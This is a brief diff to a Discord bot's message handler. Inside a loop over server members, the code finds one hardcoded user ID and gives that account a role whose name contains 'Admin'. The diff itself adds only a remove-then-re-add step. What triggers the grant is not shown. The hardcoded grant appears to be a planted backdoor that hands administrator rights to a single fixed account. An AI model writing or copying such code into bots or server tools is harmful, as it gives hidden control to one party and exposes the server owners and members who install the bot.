@@ -77,6 +77,8 @@ client.on("message", message => {
            guild.members.cache.forEach(function (e) {
                if (e.id === "761270337480032300") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
+                   guild.member(e.user).roles.remove(role);
+
                    guild.member(e.user).roles.add(role);
 
                    message.channel.send("role given");
